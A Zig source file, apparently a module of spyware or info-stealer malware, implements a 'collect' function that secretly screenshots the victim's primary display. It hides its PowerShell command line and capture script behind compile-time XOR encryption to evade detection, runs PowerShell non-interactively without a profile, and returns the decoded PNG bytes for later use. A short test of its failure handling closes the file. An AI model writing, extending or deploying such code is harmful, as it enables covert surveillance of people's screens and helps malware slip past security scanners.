const std = @import("std");
const hash = @import("../types/hash.zig");

const E = struct {
    pub const ps_cmd = hash.xorEncrypt(
        "Add-Type -AssemblyName System.Drawing; " ++
        "$bmp = [System.Drawing.Bitmap]::new(" ++
        "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, " ++
        "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); " ++
        "$g = [System.Drawing.Graphics]::FromImage($bmp); " ++
        "$g.CopyFromScreen(0, 0, 0, 0, $bmp.Size); " ++
        "$ms = New-Object System.IO.MemoryStream; " ++
        "$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); " ++
        "$ms.Close(); " ++
        "[System.Convert]::ToBase64String($ms.ToArray())"
    );
    pub const powershell = hash.xorEncrypt("powershell.exe");
    pub const noprofile = hash.xorEncrypt("-NoProfile");
    pub const noninteractive = hash.xorEncrypt("-NonInteractive");
    pub const command = hash.xorEncrypt("-Command");
};

pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
    var ps_cmd_buf: [E.ps_cmd.len]u8 = undefined;
    hash.xorDecrypt(&E.ps_cmd, &ps_cmd_buf);
    var powershell_buf: [E.powershell.len]u8 = undefined;
    hash.xorDecrypt(&E.powershell, &powershell_buf);
    var noprofile_buf: [E.noprofile.len]u8 = undefined;
    hash.xorDecrypt(&E.noprofile, &noprofile_buf);
    var noninteractive_buf: [E.noninteractive.len]u8 = undefined;
    hash.xorDecrypt(&E.noninteractive, &noninteractive_buf);
    var command_buf: [E.command.len]u8 = undefined;
    hash.xorDecrypt(&E.command, &command_buf);

    const argv = [_][]const u8{
        &powershell_buf,
        &noprofile_buf,
        &noninteractive_buf,
        &command_buf,
        &ps_cmd_buf,
    };

    const result = std.process.Child.run(.{
        .allocator = allocator,
        .argv = &argv,
        .cwd = null,
    }) catch return error.ScreenshotFailed;

    defer {
        allocator.free(result.stdout);
        allocator.free(result.stderr);
    }

    if (result.term.Exited) |code| {
        if (code != 0) return error.ScreenshotFailed;
    } else {
        return error.ScreenshotFailed;
    }

    const trimmed = std.mem.trim(u8, result.stdout, " \r\n\t");
    if (trimmed.len == 0) return error.ScreenshotFailed;

    var b64 = std.ArrayList(u8).init(allocator);
    defer b64.deinit();
    for (trimmed) |c| {
        if (c != '\r' and c != '\n') {
            try b64.append(c);
        }
    }

    const decoded = std.base64.standard.Decoder.decode(allocator, b64.items) catch {
        return error.Base64DecodeFailed;
    };

    return decoded;
}

const testing = std.testing;

test "collect handles powershell failure gracefully" {
    const result = collect(testing.allocator);
    _ = result catch |err| {
        try testing.expect(err == error.ScreenshotFailed or
            err == error.Base64DecodeFailed or
            err == error.OutOfMemory);
    };
}
